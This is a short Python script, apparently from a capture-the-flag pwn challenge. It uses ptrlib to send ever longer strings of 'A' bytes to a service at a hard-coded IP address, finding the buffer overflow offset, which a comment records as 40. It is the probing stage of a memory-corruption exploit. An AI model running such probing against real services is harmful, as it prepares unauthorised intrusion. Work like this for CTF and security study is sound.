from ptrlib import *

payload = b'A' * 8
while True:
    payload += b'A'
    sock = Socket("34.92.37.22", 10000)
    sock.recvuntil("pwn!\n")
    sock.send(payload)
    l = sock.recv(timeout=1.0)
    if b'Goodbye!\n' == l:
        sock.close()
        continue
    else:
        print(len(payload) - 1)
        print(payload)
        break

# Result: 40
